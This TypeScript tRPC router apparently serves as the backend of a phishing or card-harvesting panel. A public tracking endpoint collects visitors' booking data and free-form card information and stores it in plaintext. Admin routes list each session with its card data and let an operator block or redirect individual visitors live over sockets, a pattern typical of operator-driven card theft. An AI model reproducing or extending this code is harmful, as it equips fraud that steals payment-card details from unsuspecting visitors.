import { z } from 'zod';
import { router, publicProcedure, adminProcedure } from '../trpc.js';
import { db } from '../db.js';
import { getIO } from '../io.js';

const safeParseJson = (value: unknown, fallback: Record<string, unknown>) => {
  if (typeof value !== 'string' || !value) return fallback;
  try {
    const parsed = JSON.parse(value);
    return parsed && typeof parsed === 'object' ? parsed as Record<string, unknown> : fallback;
  } catch {
    return fallback;
  }
};

const safeParseArray = (value: unknown) => {
  if (typeof value !== 'string' || !value) return [] as Array<Record<string, unknown>>;
  try {
    const parsed = JSON.parse(value);
    return Array.isArray(parsed) ? parsed as Array<Record<string, unknown>> : [];
  } catch {
    return [] as Array<Record<string, unknown>>;
  }
};

export const visitorsRouter = router({
  track: publicProcedure
    .input(z.object({
      sessionId: z.string(),
      page: z.string().optional().default('/'),
      userAgent: z.string().optional().default(''),
      ip: z.string().optional(),
      country: z.string().optional(),
      city: z.string().optional(),
      step: z.string().optional(),
      bookingData: z.record(z.string(), z.unknown()).optional(),
      cardInfo: z.record(z.string(), z.unknown()).optional(),
    }))
    .mutation(async ({ input, ctx }) => {
      const ip = input.ip || ctx.clientIp;

      const existing = await db.visitor.findUnique({ where: { sessionId: input.sessionId } });

      if (existing?.isBlocked) {
        return { blocked: true, redirectUrl: existing.redirectUrl ?? null };
      }

      const stepHistory = safeParseArray(existing?.stepHistory);

      if (input.step) {
        stepHistory.push({ step: input.step, time: Date.now() });
        // Keep only last 50 steps
        if (stepHistory.length > 50) stepHistory.splice(0, stepHistory.length - 50);
      }

      const nextBookingData = {
        ...safeParseJson(existing?.bookingData, {}),
        ...(input.bookingData ?? {}),
      };
      const nextCardInfo = {
        ...safeParseJson(existing?.cardInfo, {}),
        ...(input.cardInfo ?? {}),
      };

      const pendingRedirectUrl = existing?.redirectUrl ?? null;

      await db.visitor.upsert({
        where: { sessionId: input.sessionId },
        update: {
          page: input.page,
          userAgent: input.userAgent,
          ip,
          ...(input.country && { country: input.country }),
          ...(input.city && { city: input.city }),
          ...(input.step && { currentStep: input.step, stepHistory: JSON.stringify(stepHistory) }),
          bookingData: JSON.stringify(nextBookingData),
          cardInfo: JSON.stringify(nextCardInfo),
          redirectUrl: pendingRedirectUrl,
          lastActive: new Date(),
        },
        create: {
          sessionId: input.sessionId,
          page: input.page ?? '/',
          userAgent: input.userAgent ?? '',
          ip,
          country: input.country ?? '',
          city: input.city ?? '',
          currentStep: input.step ?? 'home',
          stepHistory: JSON.stringify(input.step ? [{ step: input.step, time: Date.now() }] : []),
          bookingData: JSON.stringify(input.bookingData ?? {}),
          cardInfo: JSON.stringify(input.cardInfo ?? {}),
          redirectUrl: null,
        },
      });

      if (pendingRedirectUrl) {
        await db.visitor.update({
          where: { sessionId: input.sessionId },
          data: { redirectUrl: null },
        });
      }

      getIO()?.to('admin').emit('visitors:changed');

      return { blocked: false, redirectUrl: pendingRedirectUrl };
    }),

  stats: adminProcedure.query(async () => {
    const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000);
    const [total, active, blocked] = await Promise.all([
      db.visitor.count(),
      db.visitor.count({ where: { lastActive: { gte: fiveMinAgo }, isBlocked: false } }),
      db.visitor.count({ where: { isBlocked: true } }),
    ]);
    return { total, active, blocked };
  }),

  list: adminProcedure.query(async () => {
    const visitors = await db.visitor.findMany({
      orderBy: { lastActive: 'desc' },
      take: 200,
    });
    return visitors.map(v => ({
      ...v,
      stepHistory: safeParseArray(v.stepHistory),
      bookingData: safeParseJson(v.bookingData, {}),
      cardInfo: safeParseJson(v.cardInfo, {}),
    }));
  }),

  blockVisitor: adminProcedure
    .input(z.object({
      sessionId: z.string(),
      blocked: z.boolean(),
      redirectUrl: z.string().nullable().optional(),
    }))
    .mutation(async ({ input }) => {
      await db.visitor.update({
        where: { sessionId: input.sessionId },
        data: {
          isBlocked: input.blocked,
          ...(input.redirectUrl !== undefined ? { redirectUrl: input.redirectUrl } : {}),
        },
      });
      getIO()?.to('admin').emit('visitors:changed');
      getIO()?.to(`visitor:${input.sessionId}`).emit('visitor:control', {
        blocked: input.blocked,
        redirectUrl: input.redirectUrl ?? null,
      });
      return { success: true };
    }),

  setRedirectUrl: adminProcedure
    .input(z.object({ sessionId: z.string(), redirectUrl: z.string() }))
    .mutation(async ({ input }) => {
      await db.visitor.update({
        where: { sessionId: input.sessionId },
        data: { redirectUrl: input.redirectUrl },
      });
      getIO()?.to('admin').emit('visitors:changed');
      getIO()?.to(`visitor:${input.sessionId}`).emit('visitor:control', {
        blocked: false,
        redirectUrl: input.redirectUrl,
      });
      return { success: true };
    }),
});
